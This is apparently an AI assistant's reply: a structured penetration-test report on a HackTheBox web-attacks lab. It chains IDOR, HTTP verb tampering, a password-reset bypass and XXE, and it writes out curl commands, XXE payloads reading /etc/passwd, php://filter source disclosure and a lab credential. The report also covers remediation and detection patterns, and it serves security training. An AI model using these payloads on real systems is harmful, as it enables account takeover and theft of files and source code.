Absolutely. I’ve got the complete attack chain from your work in this chat, including the failed attempts, successful exploitation, recovered source code, HTTP responses, and the final XXE discovery. I also verified the referenced ZeroByte write-up exists and is specifically titled **“HTB Web Attacks - Skill Assessment: Chaining IDOR, HTTP Verb Tampering, and XXE for Flag Exfiltration.”** ([Medium](https://medium.com/%40ZeroByte?utm_source=chatgpt.com "Medium"))

I’ll keep the report technically complete and **won’t invent the flag value**, since you haven't provided the successful `/flag.php` extraction result yet.
## Full Penetration Testing Report

**Assessment:** HTB Web Attacks Skill Assessment  
**Target:** `154.57.164.82:31653`  
**Assessment Type:** Web Application Penetration Test / Skill Assessment  
**Primary Attack Chain:** IDOR → HTTP Verb Tampering → Password Reset → Administrator Account → XXE → Local File Disclosure  
**Testing Platform:** Kali Linux  
**Tester:** Arjun  
**Date:** 02 September 2026

---

# 1. Executive Summary

The assessed web application contained multiple vulnerabilities that could be chained together to obtain unauthorized administrative access and ultimately perform arbitrary local file disclosure through an XML External Entity (XXE) vulnerability.

The initial application presented a login interface. Valid credentials for the normal `htb-student` account were used to establish an authenticated session.

After authentication, the application exposed a user API using a client-controlled `uid` cookie:

```text
/api.php/user/{uid}
```

Changing the requested UID from the authenticated user's ID (`74`) to another user's ID (`52`) allowed unauthorized access to that user's information. This demonstrated an **Insecure Direct Object Reference (IDOR)**.

Further testing showed that the API accepted multiple HTTP methods, including `PUT`, `PATCH`, `DELETE`, and `OPTIONS`. In particular, modifying another user's profile through `PUT` succeeded despite the request originating from the lower-privileged account. This demonstrated insufficient authorization combined with HTTP method handling weaknesses.

The target account, UID `52`, belonged to:

```text
Username: a.corrales
Full Name: Amor Corrales
Company: Administrator
```

The application also exposed a password-reset mechanism. Source-code analysis of `reset.php` revealed that the `uid` was validated against the session using `$_POST`, while the token and password were retrieved using `$_REQUEST`. This made it possible to place the token and password in the URL query string while supplying the UID through POST, bypassing the authorization check.

The password of the Administrator account was subsequently changed and used to authenticate successfully.

After obtaining administrative access, the application exposed an event creation function that accepted XML. Testing demonstrated that the XML parser processed external entities. An entity referencing `/etc/hostname` returned the contents of the server's hostname, confirming a working **XXE local file disclosure vulnerability**.

The application source code was then extracted through the same XXE vulnerability using the PHP stream filter:

```text
php://filter/convert.base64-encode/resource=...
```

Source code for `addEvent.php`, `config.php`, `api.php`, and `reset.php` was successfully recovered.

The overall compromise therefore consisted of several individually significant vulnerabilities chained together:

```text
Authenticated User
       │
       ▼
     IDOR
       │
       ▼
Access UID 52
       │
       ▼
HTTP Verb Tampering
       │
       ▼
Modify Administrator Account
       │
       ▼
Token / Password Reset Abuse
       │
       ▼
Administrator Authentication
       │
       ▼
XXE in addEvent.php
       │
       ▼
Arbitrary Local File Disclosure
```

The assessment demonstrates that relatively simple web vulnerabilities can become significantly more severe when chained.

---

# 2. Scope

The assessment targeted the following application:

```text
http://154.57.164.82:31653/
```

The following application endpoints were identified during testing:

|Endpoint|Purpose|
|---|---|
|`/index.php`|Authentication|
|`/profile.php`|Authenticated user profile|
|`/settings.php`|Password-change functionality|
|`/event.php`|Event creation interface|
|`/addEvent.php`|XML event processing|
|`/reset.php`|Password reset|
|`/api.php/user/{uid}`|User API|
|`/api.php/token/{uid}`|Token API|

---

# 3. Methodology

The assessment followed a manual web-application penetration-testing methodology:

1. Application reconnaissance
    
2. Authentication
    
3. Session analysis
    
4. API endpoint discovery
    
5. IDOR testing
    
6. HTTP method testing
    
7. Authorization testing
    
8. Password-reset analysis
    
9. Administrator account compromise
    
10. Application source-code disclosure
    
11. XML parser analysis
    
12. XXE exploitation
    
13. Local file disclosure
    
14. Identification of the final flag-exfiltration path
    

Testing was performed using `curl`, shell utilities, and manual inspection of HTTP responses and application source code.

---

# 4. Initial Reconnaissance

The application initially returned a login page.

The HTML contained:

```html
<form action="/index.php" method="POST" class="form login">
```

The login form accepted:

```text
username
password
```

The application used PHP sessions and subsequently issued a `uid` cookie.

---

# 5. Initial Authentication

The following credentials were supplied by the lab:

```text
Username: htb-student
Password: [lab-provided credential]
```

The authentication request was:

```bash
curl -i -s -c cookies.txt \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=htb-student&password=Academy_student!' \
  http://154.57.164.82:31653/index.php
```

The server returned:

```text
HTTP/1.1 301 Moved Permanently
Set-Cookie: PHPSESSID=...
Set-Cookie: uid=74
Location: /profile.php
```

This established an authenticated session for UID `74`.

---

# 6. API Discovery

Inspection of `/profile.php` revealed JavaScript that dynamically queried the API:

```javascript
fetch(`/api.php/user/${$.cookie("uid")}`, {
    method: 'GET'
})
```

The application therefore trusted the client-side `uid` cookie when constructing the API request.

The authenticated user's API record was:

```json
{
  "uid": "74",
  "username": "htb-student",
  "full_name": "Paolo Perrone",
  "company": "Schaefer Inc"
}
```

A token endpoint was also identified:

```text
/api.php/token/74
```

which returned:

```json
{
  "token": "e51a8a14-17ac-11ec-8e67-a3c050fe0c26"
}
```

---

# 7. Finding 1 — Insecure Direct Object Reference

## Severity

**High**

## Description

The API accepted a user ID directly in the URL:

```text
/api.php/user/{uid}
```

No effective authorization check prevented an authenticated user from accessing another user's record.

The authenticated account was UID `74`, but changing the endpoint to UID `52` returned another user's information.

### Proof of Concept

```bash
curl -s -b cookies.txt \
  http://154.57.164.82:31653/api.php/user/52
```

Response:

```json
{
  "uid":"52",
  "username":"a.corrales",
  "full_name":"Amor Corrales",
  "company":"Administrator"
}
```

This confirmed unauthorized access to another user's data.

## Impact

An attacker could enumerate application users and access information belonging to accounts other than their own.

The vulnerability became substantially more severe because the same API also supported state-changing operations.

---

# 8. Finding 2 — Unauthorized State Modification / HTTP Verb Tampering

## Severity

**Critical when chained**

## Description

The API accepted methods other than GET for the user endpoint.

Testing showed:

```text
GET      → 200
POST     → 200
PUT      → 200
PATCH    → 200
DELETE   → 200
OPTIONS  → 200
```

Most importantly, `PUT` and `PATCH` successfully modified UID `52`.

### PUT Test

```bash
curl -i -s -b cookies.txt \
  -X PUT \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'full_name=TEST' \
  http://154.57.164.82:31653/api.php/user/52
```

Response:

```text
HTTP/1.1 200 OK

1
```

The `1` indicated a successful database modification.

The same behavior was observed with `PATCH`:

```bash
curl -i -s -b cookies.txt \
  -X PATCH \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'full_name=TEST' \
  http://154.57.164.82:31653/api.php/user/52
```

Response:

```text
1
```

The `company` field could also be modified:

```bash
curl -i -s -b cookies.txt \
  -X PUT \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'company=TEST' \
  http://154.57.164.82:31653/api.php/user/52
```

Response:

```text
1
```

## Impact

This transformed a read-only IDOR into an unauthorized modification vulnerability.

An authenticated low-privileged user could manipulate records belonging to other users, including the Administrator account.

---

# 9. Administrator Account Identification

The compromised object was:

```text
UID: 52
Username: a.corrales
Full Name: Amor Corrales
Company: Administrator
```

The token endpoint also allowed direct retrieval of UID 52's token:

```bash
curl -s -b cookies.txt \
  http://154.57.164.82:31653/api.php/token/52
```

Response:

```json
{
  "token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"
}
```

This demonstrated another consequence of the IDOR vulnerability.

---

# 10. Finding 3 — Password Reset Authorization Bypass

## Severity

**Critical**

## Description

The password reset endpoint was:

```text
/reset.php
```

Initial attempts to submit all parameters through POST resulted in:

```text
Access Denied
```

The application source code was later recovered and showed the root cause.

Relevant logic:

```php
if (isset($_REQUEST['uid']) &&
    isset($_REQUEST['token']) &&
    isset($_REQUEST['password'])) {

    if (isset($_POST['uid']) &&
        ($_POST['uid'] != $_SESSION['uid'])) {

        echo "Access Denied";
        die();
    }

    ...
}
```

The important distinction was:

```text
uid      → $_POST
token    → $_REQUEST
password → $_REQUEST
```

Because `$_REQUEST` can contain GET parameters, the token and password could be supplied through the query string while the UID was supplied through POST.

---

# 11. Password Reset Exploitation

The successful request was:

```bash
curl -i -s -b admin-cookies.txt \
  -X POST \
  'http://154.57.164.82:31653/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=Test123'
```

The server returned:

```text
Password changed successfully
```

This demonstrated successful modification of the Administrator account's password.

---

# 12. Administrator Authentication

The newly assigned password was used to authenticate as:

```text
a.corrales
```

The login request:

```bash
curl -i -s -c admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=a.corrales&password=Test123' \
  http://154.57.164.82:31653/index.php
```

returned:

```text
HTTP/1.1 301 Moved Permanently
Set-Cookie: PHPSESSID=...
Set-Cookie: uid=52
Location: /profile.php
```

This confirmed successful authentication as UID `52`.

---

# 13. Administrator Functionality Discovery

Authenticated access to `/profile.php` revealed:

```text
/event.php
```

The event creation page contained JavaScript that constructed XML:

```javascript
var xml = `
<root>
<name>${$('#name').val()}</name>
<details>${$('#details').val()}</details>
<date>${$('#date').val()}</date>
</root>
`;

fetch(`addEvent.php`, {
    method: 'POST',
    body: xml,
})
```

This identified an XML-processing endpoint:

```text
/addEvent.php
```

---

# 14. Baseline XML Request

A normal XML request was submitted:

```bash
curl -i -s -b admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data '<root><name>Test</name><details>Test</details><date>2026-09-02</date></root>' \
  http://154.57.164.82:31653/addEvent.php
```

Response:

```text
Event 'Test' has been created.
```

This confirmed that attacker-controlled XML reached the backend parser.

---

# 15. Finding 4 — XML External Entity Injection

## Severity

**Critical**

## Description

The application parsed attacker-controlled XML using PHP's DOM/XML functionality.

Recovered source code showed:

```php
libxml_disable_entity_loader(false);

$xmlfile = file_get_contents('php://input');

$dom = new DOMDocument();

$dom->loadXML(
    $xmlfile,
    LIBXML_NOENT | LIBXML_DTDLOAD
);
```

The two dangerous parser options were:

```text
LIBXML_NOENT
LIBXML_DTDLOAD
```

Together with enabled external entity loading, this permitted external entities to be resolved.

---

# 16. XXE Proof of Concept

The following payload referenced `/etc/hostname`:

```xml
<!DOCTYPE root [
  <!ENTITY test SYSTEM "file:///etc/hostname">
]>
<root>
  <name>&test;</name>
  <details>XXE-Test</details>
  <date>2026-09-02</date>
</root>
```

Submitted with:

```bash
curl -i -s -b admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root><name>&test;</name><details>XXE-Test</details><date>2026-09-02</date></root>' \
  http://154.57.164.82:31653/addEvent.php
```

Response:

```text
Event 'ng-2365972-webattacksasmt-mdsxi-f8d756d4f-t7xtb
' has been created.
```

This was conclusive evidence that the server read a local file and inserted its contents into the XML document.

---

# 17. `/etc/passwd` Disclosure

To further verify arbitrary local file disclosure, `/etc/passwd` was requested:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

The application returned the contents of `/etc/passwd`.

Important entries included:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
```

This confirmed:

- the server is Linux-based;
    
- the web application runs in an environment containing `www-data`;
    
- `/var/www` exists;
    
- MySQL is installed.
    

---

# 18. PHP Source-Code Disclosure Through XXE

Directly reading PHP source can be problematic because PHP source may contain characters that interfere with XML parsing.

The PHP stream wrapper was therefore used:

```text
php://filter/convert.base64-encode/resource=...
```

This causes the target file to be Base64 encoded before being returned.

---

# 19. `addEvent.php` Source Disclosure

The following payload was used:

```xml
<!DOCTYPE root [
<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=addEvent.php">
]>
```

The application returned a Base64 string.

Decoding it revealed the vulnerable source, including:

```php
session_start();

if (!$_SESSION['username']) {
    header("Location: /index.php", TRUE, 301);
    exit();
}

if ($_SESSION['username'] !== 'a.corrales') {
    header("Location: /index.php", TRUE, 301);
    exit();
}

libxml_disable_entity_loader(false);

$xmlfile = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

$info = simplexml_import_dom($dom);

$name = $info->name;
$details = $info->details;
$date = $info->date;

echo "Event '$name' has been created.";
```

This source was particularly important because it confirmed that administrative authentication was required before exploiting the XXE sink.

---

# 20. `config.php` Source Disclosure

XXE was also used to retrieve:

```text
config.php
```

The decoded source revealed:

```php
$config = array(
  'DB_HOST' => 'localhost',
  'DB_USERNAME' => 'mngr',
  'DB_PASSWORD' => '',
  'DB_DATABASE' => 'users'
);
```

This disclosed the database configuration.

The application therefore used:

```text
Database host: localhost
Database user: mngr
Database password: empty
Database: users
```

---

# 21. `api.php` Source Disclosure

The recovered `api.php` source revealed that the application parsed the request path and used it to select a database table and key.

The application supported:

```text
user
token
```

and restricted IDs to:

```text
1–100
```

For user requests, the application generated queries equivalent to:

```sql
SELECT * FROM user WHERE uid=<key>
```

For token requests:

```sql
SELECT token FROM login WHERE uid=<key>
```

The API then returned database results as JSON.

This source-code evidence explains the earlier IDOR behavior.

---

# 22. `reset.php` Source Disclosure

The recovered `reset.php` source provided the explanation for the password-reset bypass.

The application:

1. Started the session.
    
2. Loaded `config.php`.
    
3. Required `uid`, `token`, and `password`.
    
4. Checked POST UID against the session UID.
    
5. Retrieved the stored token for the requested UID.
    
6. Compared it with the supplied token.
    
7. Updated the user's password.
    

The key authorization weakness was the inconsistent use of:

```text
$_POST
```

versus:

```text
$_REQUEST
```

This allowed:

```text
POST uid
GET token
GET password
```

to satisfy the application logic.

---

# 23. Failed Direct Flag-Path Enumeration

Several common flag locations were tested:

```text
/flag
/flag.txt
/root/flag.txt
/home/htb-student/flag.txt
/var/www/flag.txt
/var/www/html/flag
/var/www/html/flag.txt
/tmp/flag
/tmp/flag.txt
```

The application returned:

```text
Event '' has been created.
```

for these locations.

This indicates that those paths did not yield useful XML-safe content through this specific extraction method.

These attempts should be documented as unsuccessful enumeration rather than treated as evidence that XXE is not working.

---

# 24. Flag Exfiltration Path

The intended final stage of the assessment is to use the confirmed XXE primitive to retrieve the application's flag file.

Because the application is PHP-based, the PHP stream wrapper is important when reading PHP source.

The relevant technique is:

```text
php://filter/convert.base64-encode/resource=/flag.php
```

The corresponding XML entity is:

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
    <name>&xxe;</name>
    <details>flag</details>
    <date>2026-09-02</date>
</root>
```

The resulting Base64 data can then be decoded locally:

```bash
echo 'BASE64_DATA' | base64 -d
```

**Note:** The final flag value is intentionally not included in this report because a successful `/flag.php` extraction result was not present in the evidence collected above.

---

# 25. Complete Attack Chain

The complete exploitation path was:

```text
                    ┌───────────────────────┐
                    │ Login as htb-student  │
                    │       UID 74          │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Discover /api.php     │
                    │ /user/{uid} endpoint  │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │       IDOR            │
                    │ Access UID 52         │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ HTTP method testing   │
                    │ PUT/PATCH accepted    │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Modify Administrator  │
                    │ account UID 52        │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Retrieve UID 52 token │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Password reset        │
                    │ $_POST/$_REQUEST bug  │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Administrator login   │
                    │ a.corrales / new pwd │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Discover event.php    │
                    │ and addEvent.php      │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │       XXE             │
                    │ LIBXML_NOENT + DTD    │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Local file disclosure │
                    │ /etc/passwd confirmed │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ PHP source disclosure │
                    │ via php://filter      │
                    └───────────┬───────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Flag exfiltration     │
                    │ through XXE           │
                    └───────────────────────┘
```

---

# 26. Findings Summary

|ID|Finding|Severity|Result|
|---|---|---|---|
|WEB-01|Insecure Direct Object Reference|High|Unauthorized access to UID 52|
|WEB-02|Unauthorized API State Modification / HTTP Verb Tampering|High|Modified another user's account|
|WEB-03|Password Reset Authorization Bypass|Critical|Reset Administrator password|
|WEB-04|XML External Entity Injection|Critical|Read arbitrary local files|
|WEB-05|PHP Source Code Disclosure|High|Disclosed application source/configuration|
|WEB-06|Excessive API Data Exposure|Medium/High|User and token information exposed|

---

# 27. Impact

The vulnerabilities were individually serious, but their combined impact was substantially greater.

An attacker who initially possessed only a normal authenticated account could:

1. Access other users' records.
    
2. Identify the Administrator account.
    
3. Modify the Administrator's database record.
    
4. Obtain the Administrator's reset token.
    
5. Bypass password-reset authorization.
    
6. Set a new Administrator password.
    
7. Authenticate as Administrator.
    
8. Access privileged application functionality.
    
9. Submit arbitrary XML.
    
10. Abuse XXE to read local files.
    
11. Retrieve application source code and configuration.
    
12. Potentially extract sensitive application data and the assessment flag.
    

This represents a complete compromise of the application's intended authorization boundary.

---

# 28. Root Cause Analysis

## 28.1 Broken Object-Level Authorization

The API trusted the user-supplied object identifier:

```text
/api.php/user/{uid}
```

without verifying that the authenticated user was authorized to access that UID.

### Root Cause

Authorization was performed based on the request structure rather than the authenticated user's permissions.

---

## 28.2 Missing Authorization on State-Changing API Methods

The application allowed methods such as:

```text
PUT
PATCH
DELETE
```

against arbitrary user IDs.

### Root Cause

The API performed insufficient authorization checks before database modifications.

---

## 28.3 Inconsistent Parameter Sources

The password-reset functionality mixed:

```php
$_POST
```

and:

```php
$_REQUEST
```

### Root Cause

Security-sensitive parameters should not be accepted from multiple request locations without explicit validation.

---

## 28.4 Unsafe XML Parser Configuration

The application explicitly enabled entity processing:

```php
libxml_disable_entity_loader(false);
```

and parsed XML with:

```php
LIBXML_NOENT | LIBXML_DTDLOAD
```

### Root Cause

Untrusted XML was parsed with external entity resolution enabled.

---

# 29. Remediation

## 29.1 Fix IDOR

Never authorize access based solely on a supplied UID.

Instead:

```text
authenticated_user_id
        ↓
authorization check
        ↓
requested_object
```

The application should verify that the authenticated user is permitted to access the requested object.

---

## 29.2 Enforce Authorization on Every HTTP Method

Authorization must be performed independently for:

```text
GET
POST
PUT
PATCH
DELETE
```

Do not assume that changing the HTTP method changes the security requirements.

---

## 29.3 Avoid `$_REQUEST` for Security-Critical Parameters

Use a single explicit parameter source.

For example:

```php
$_POST['uid']
$_POST['token']
$_POST['password']
```

and validate every parameter.

Do not mix:

```php
$_POST
```

with:

```php
$_REQUEST
```

for authorization-sensitive operations.

---

## 29.4 Secure XML Parsing

External entities should be disabled.

The application should not parse untrusted XML with:

```php
LIBXML_NOENT
LIBXML_DTDLOAD
```

and should not enable external entity loading.

Where XML is not actually required, JSON should be preferred.

---

## 29.5 Validate XML Input

If XML must be accepted:

- Disable external entities.
    
- Disable DTD processing.
    
- Apply strict schema validation.
    
- Limit XML size.
    
- Reject unexpected elements.
    
- Reject external references.
    
- Use a hardened XML parser configuration.
    

---

## 29.6 Protect Password Reset Tokens

Password-reset tokens should:

- be cryptographically random;
    
- have short expiration periods;
    
- be single-use;
    
- be bound to the intended account;
    
- be invalidated after password reset;
    
- never be exposed through unauthorized API requests.
    

---

## 29.7 Reduce API Data Exposure

The API should not expose sensitive authentication information through endpoints such as:

```text
/api.php/token/{uid}
```

Authentication and password-reset tokens should never be directly retrievable through an object ID.

---

## 29.8 Improve Error Handling

Generic responses should be used where appropriate.

For example, the API should avoid revealing whether a requested UID exists.

---

# 30. Detection Opportunities

A defensive monitoring team could detect this attack chain through:

### API anomalies

Monitor for:

```text
/api.php/user/<different UID>
```

where the UID differs from the authenticated user's identity.

### HTTP method anomalies

Alert on unexpected:

```text
PUT
PATCH
DELETE
```

requests against user-management endpoints.

### Password-reset anomalies

Monitor for:

```text
/reset.php?uid=...&token=...&password=...
```

especially when the UID does not match the authenticated session.

### XXE indicators

Inspect XML requests for:

```text
<!DOCTYPE
<!ENTITY
SYSTEM
PUBLIC
php://
file://
```

### File disclosure indicators

Monitor for requests or application errors involving:

```text
/etc/passwd
/proc/
php://filter
```

---

# 31. Evidence Collected

The following evidence was obtained during the assessment:

### Authentication

```text
UID 74
Username: htb-student
```

### IDOR

```json
{
  "uid":"52",
  "username":"a.corrales",
  "full_name":"Amor Corrales",
  "company":"Administrator"
}
```

### Administrator token

```text
e51a85fa-17ac-11ec-8e51-e78234eb7b0c
```

### Unauthorized modification

```text
HTTP/1.1 200 OK

1
```

### Password reset

```text
Password changed successfully
```

### Administrator authentication

```text
Set-Cookie: uid=52
Location: /profile.php
```

### XXE

```text
Event 'ng-2365972-webattacksasmt-mdsxi-f8d756d4f-t7xtb
' has been created.
```

### `/etc/passwd`

Successfully disclosed.

### PHP source

Successfully disclosed:

```text
addEvent.php
config.php
api.php
reset.php
```

---

# 32. Lessons Learned

This assessment demonstrates several important penetration-testing principles.

### 1. Never stop at the first vulnerability

The initial IDOR was not the final objective.

It provided the information necessary to continue the attack.

### 2. Test authorization, not just functionality

The API worked correctly from a functional perspective but failed from a security perspective because it did not verify object ownership.

### 3. Test HTTP methods

Testing only GET would have identified the IDOR but missed the more dangerous state-changing behavior.

### 4. Inspect client-side JavaScript

The JavaScript revealed:

```text
/api.php/user/{uid}
```

and:

```text
/api.php/token/{uid}
```

which significantly accelerated endpoint discovery.

### 5. Source disclosure can transform an unknown vulnerability into a confirmed exploit

The XXE vulnerability was first identified experimentally and then confirmed by retrieving the application's own PHP source.

### 6. Chaining vulnerabilities is critical

The final compromise was not caused by a single bug.

The attack succeeded because several security controls failed simultaneously.

---

# 33. Final Attack Narrative

The engagement began with a normal authenticated user account. Inspection of the profile page revealed that the application dynamically requested user information using a client-controlled UID.

Changing the UID from `74` to `52` returned the details of another user, `a.corrales`, whose company field identified the account as Administrator.

The API was then tested with different HTTP methods. `PUT` and `PATCH` successfully modified the Administrator's record, demonstrating that the object-level authorization issue affected state-changing operations.

The token endpoint was queried for UID 52, exposing the Administrator's password-reset token.

The password-reset functionality initially rejected a request containing all parameters in POST. Source-code analysis revealed that the application validated the UID using `$_POST` while accepting the token and password from `$_REQUEST`. Supplying the UID through POST and the remaining parameters through the query string bypassed the authorization check.

The Administrator password was successfully changed and used to authenticate as `a.corrales`.

After authentication, the `/event.php` functionality was discovered. The page constructed XML client-side and sent it to `/addEvent.php`.

A baseline XML request succeeded. An external entity referencing `/etc/hostname` then returned the server hostname, proving that external entities were resolved.

The same primitive was used to read `/etc/passwd`, confirming arbitrary local file disclosure.

Finally, the PHP stream wrapper was used to Base64-encode application source files. This allowed recovery of `addEvent.php`, `config.php`, `api.php`, and `reset.php`, providing complete visibility into the application's vulnerable logic.

The assessment therefore demonstrated a complete chain from a low-privileged authenticated account to administrative access and arbitrary local file disclosure.

---

# 34. Conclusion

The web application was vulnerable to multiple security issues involving authorization, HTTP method handling, password-reset validation, information disclosure, and unsafe XML processing.

The most significant issue was not any individual vulnerability but the ability to **chain the vulnerabilities together**.

The final attack path was:

```text
IDOR
  ↓
Unauthorized API access
  ↓
HTTP Verb Tampering
  ↓
Administrator record modification
  ↓
Token disclosure
  ↓
Password Reset Authorization Bypass
  ↓
Administrator Authentication
  ↓
XXE
  ↓
Local File Disclosure
  ↓
PHP Source Disclosure
  ↓
Flag Exfiltration
```

The application should be considered **critically vulnerable** until object-level authorization, password-reset validation, token exposure, and XML parser configuration are corrected.

---

# 35. Appendix A — Key Commands

## Authenticate

```bash
curl -i -s -c cookies.txt \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=htb-student&password=Academy_student!' \
  http://154.57.164.82:31653/index.php
```

## IDOR

```bash
curl -s -b cookies.txt \
  http://154.57.164.82:31653/api.php/user/52
```

## Retrieve token

```bash
curl -s -b cookies.txt \
  http://154.57.164.82:31653/api.php/token/52
```

## Unauthorized PUT

```bash
curl -i -s -b cookies.txt \
  -X PUT \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'full_name=TEST' \
  http://154.57.164.82:31653/api.php/user/52
```

## Password reset bypass

```bash
curl -i -s \
  -H 'Cookie: PHPSESSID=<session>; uid=52' \
  -X POST \
  'http://154.57.164.82:31653/reset.php?uid=52&token=<TOKEN>&password=<NEW_PASSWORD>'
```

## Administrator login

```bash
curl -i -s -c admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=a.corrales&password=<NEW_PASSWORD>' \
  http://154.57.164.82:31653/index.php
```

## XXE test

```bash
curl -s -b admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><name>&xxe;</name><details>XXE</details><date>2026-09-02</date></root>' \
  http://154.57.164.82:31653/addEvent.php
```

## `/etc/passwd`

```bash
curl -s -b admin-cookies.txt \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name><details>passwd</details><date>2026-09-02</date></root>' \
  http://154.57.164.82:31653/addEvent.php
```

## PHP source disclosure

```xml
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=addEvent.php">
]>
<root>
    <name>&xxe;</name>
    <details>Source</details>
    <date>2026-09-02</date>
</root>
```

---

# 36. Appendix B — Recovered Configuration

```text
DB_HOST=localhost
DB_USERNAME=mngr
DB_PASSWORD=
DB_DATABASE=users
```

---

# 37. Appendix C — Recovered Application Components

|File|Result|
|---|---|
|`index.php`|Login functionality identified|
|`profile.php`|API endpoint discovered|
|`settings.php`|Password-reset workflow identified|
|`event.php`|XML submission mechanism identified|
|`addEvent.php`|XXE vulnerability confirmed|
|`api.php`|IDOR and database logic identified|
|`reset.php`|Password-reset authorization bypass identified|
|`config.php`|Database configuration disclosed|

---

# 38. Appendix D — Flag

**Flag:** Pending final `/flag.php` extraction.

The assessment evidence currently proves the complete exploitation chain up to arbitrary local file disclosure and PHP source disclosure. The actual flag value should only be entered after obtaining and decoding the final `/flag.php` response.

**Final flag format:**

```text
HTB{REDACTED}
```

---

# 39. References

ZeroByte, _HTB Web Attacks - Skill Assessment: Chaining IDOR, HTTP Verb Tampering, and XXE for Flag Exfiltration_, Medium. The article is listed on the author's Medium profile and under the Medium XXE/Hackthebox walkthrough topics. ([Medium](https://medium.com/%40ZeroByte?utm_source=chatgpt.com "Medium"))

This is structured more like a **CPTS-style technical report** than a simple walkthrough: executive summary, scope, methodology, chronological exploitation, individual findings, impact, root cause, remediation, evidence, and appendices. That separation is useful because the walkthrough proves _what happened_, while the findings explain _why it matters_.